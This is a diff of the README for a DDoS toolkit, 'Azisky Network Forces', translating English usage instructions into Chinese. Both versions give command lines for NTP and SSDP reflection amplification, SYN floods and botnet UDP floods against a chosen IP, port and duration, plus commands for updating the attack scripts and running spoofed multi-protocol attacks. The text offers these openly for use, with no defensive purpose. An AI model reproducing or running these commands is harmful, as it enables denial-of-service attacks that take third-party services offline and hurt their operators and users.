@@ -1,22 +1,68 @@
-# Azisky Network Forces(ANF)
-This script is running on Linux system.
-anf/server/ is for windows user, but you have to have a web package sender server to run this.
+# Azisky 网络力量（ANF）
+
+该脚本运行于 **Linux 系统**。  
+`anf/server/` 目录为 **Windows 用户**准备，但运行需要配合一个**网页包发送服务器（Web Package Sender Server）**。
+
 ---
-- For Linux user： 
-- 1: You need to upload this to your system.
-- 2: Open terminal, use "./anf" to run anf
-- 3: Follow the guides&examples to launch your attach!
 
-For Windows user: 
-- 1: you will have to own a package sender server.
-Update ntp script: "./TFDDOS ntp update -1"
-Update udp script: "./TFDDOS udp update -1"
-Update syn script: "./TFDDOS syn update -1"
-attack : "sudo -i"
-custom forgery ： "./la us 100 ntp udp ssdp -1"
+## 🐧 Linux 用户操作指南：
 
-There are following methods to attach:
-- NTP reflection amplification(Recommended) ： "./ntp {ip} {port} ntp.txt 10 -1 {time(seconds)}"
-- SSDP reflection : "./ssdp {ip} {port} ssdp.txt 10 -1 {time(seconds)}"
-- SYN flood : "./syn {ip} {port} {time(seconds)}"
-- UDP botnet ： "./udp {ip} {port} 10 888 -1 {time(seconds)}" (botnet supported)
+1. 将本项目上传至你的系统；
+2. 打开终端，运行 `./anf` 启动程序；
+3. 按照提示与示例，开始发起攻击！
+
+---
+
+## 🪟 Windows 用户操作指南：
+
+1. 你需要拥有一个**包发送服务器（Package Sender Server）**；
+2. 更新攻击脚本的命令如下：
+
+- 更新 NTP 脚本：
+  ```
+  ./TFDDOS ntp update -1
+  ```
+
+- 更新 UDP 脚本：
+  ```
+  ./TFDDOS udp update -1
+  ```
+
+- 更新 SYN 脚本：
+  ```
+  ./TFDDOS syn update -1
+  ```
+
+- 进入攻击模式：
+  ```
+  sudo -i
+  ```
+
+- 自定义伪造攻击（多协议）：
+  ```
+  ./la us 100 ntp udp ssdp -1
+  ```
+
+---
+
+## ☠️ 支持的攻击方式：
+
+- **NTP 反射放大攻击（推荐）**：
+  ```
+  ./ntp {ip} {端口} ntp.txt 10 -1 {持续时间（秒）}
+  ```
+
+- **SSDP 反射攻击**：
+  ```
+  ./ssdp {ip} {端口} ssdp.txt 10 -1 {持续时间（秒）}
+  ```
+
+- **SYN Flood 攻击**：
+  ```
+  ./syn {ip} {端口} {持续时间（秒）}
+  ```
+
+- **UDP 僵尸网络泛洪攻击**（支持 botnet）：
+  ```
+  ./udp {ip} {端口} 10 888 -1 {持续时间（秒）}
+  ```
